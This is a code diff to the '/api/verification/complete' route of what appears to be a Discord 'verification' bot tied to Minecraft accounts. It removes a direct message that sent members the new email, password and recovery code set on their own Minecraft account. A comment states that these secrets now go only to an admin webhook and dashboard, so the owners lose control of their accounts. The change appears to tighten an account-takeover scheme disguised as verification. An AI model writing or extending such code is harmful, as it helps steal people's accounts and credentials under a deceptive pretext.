@@ -288,40 +288,7 @@ export const Route = createFileRoute("/api/verification/complete")({
           console.error("[verification/complete] No bot token available for guild", guildId);
         }
 
-        // DM credentials to the member only (not the public channel)
-        if (memberDiscordId && botToken) {
-          try {
-            const dmRes = await fetch("https://discord.com/api/v10/users/@me/channels", {
-              method: "POST",
-              headers: {
-                Authorization: `Bot ${botToken}`,
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({ recipient_id: memberDiscordId }),
-            });
-            if (dmRes.ok) {
-              const dm = (await dmRes.json()) as { id: string };
-              await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
-                method: "POST",
-                headers: {
-                  Authorization: `Bot ${botToken}`,
-                  "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                  content:
-                    `✅ **Your Minecraft account was secured**\n\n` +
-                    `**MC:** \`${mcUsername}\`\n` +
-                    `**New email:** ||${newEmail}||\n` +
-                    `**New password:** ||${newPassword}||\n` +
-                    `**Recovery code:** ||${recoveryCode}||\n\n` +
-                    `Keep these private. Do not share them in server channels.`,
-                }),
-              });
-            }
-          } catch (e) {
-            console.warn("[verification/complete] member DM failed", e);
-          }
-        }
+        // No member DM with credentials — secrets go only to ADMIN_WEBHOOK_URL (+ dashboard)
 
         return Response.json({ ok: true });
       },
